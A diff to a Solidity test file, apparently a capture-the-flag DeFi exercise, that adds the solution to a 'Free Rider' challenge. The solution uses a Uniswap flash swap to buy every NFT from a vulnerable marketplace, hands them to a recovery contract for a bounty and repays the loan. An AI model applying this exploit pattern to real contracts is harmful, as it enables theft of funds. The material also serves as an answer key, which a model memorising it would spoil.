@@ -123,8 +123,41 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        address token0 = uniswapPair.token0();
+        address token1 = uniswapPair.token1();
+        uint256 amount0Out = token0 == address(weth) ? NFT_PRICE : 0;
+        uint256 amount1Out = token1 == address(weth) ? NFT_PRICE : 0;
+        uniswapPair.swap(amount0Out, amount1Out, address(this), "0x1");
     }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == address(uniswapPair), "Unauthorized");
+        uint256 amountBorrowed = amount0 == 0 ? amount1 : amount0;
+        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            ids[i] = i;
+        }
+        marketplace.buyMany{value: amountBorrowed}(ids);
+        bytes memory data1 = abi.encode(address(this));
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, data1);
+        }
+
+        uint256 fee = (amountBorrowed * 3) / 997 + 1;
+        uint256 amountToRepay = amountBorrowed + fee;
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(uniswapPair), amountToRepay);
+        address(player).call{value: BOUNTY}("");
+    }
+
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
+    }
+
+    receive() external payable {}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
